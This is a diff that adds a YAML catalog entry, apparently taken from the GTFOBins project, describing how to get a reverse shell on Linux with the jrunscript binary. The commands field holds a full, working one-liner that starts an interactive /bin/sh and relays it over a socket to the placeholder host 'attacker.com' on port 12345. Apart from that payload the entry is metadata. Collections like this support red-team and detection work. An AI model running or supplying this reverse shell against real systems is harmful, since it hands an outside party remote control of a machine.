@@ -1,0 +1,29 @@
+id: gtfobins/jrunscript/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: jrunscript
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: "jrunscript -e 'var host=\"attacker.com\";\n    var port=12345;\n    var p=new java.lang.ProcessBuilder(\"\
+    /bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n\
+    \    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n\
+    \    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n\
+    \    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n\
+    \    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
+references:
+- https://gtfobins.github.io/gtfobins/jrunscript/
+tags:
+- linux
+- unix
+- gtfobins
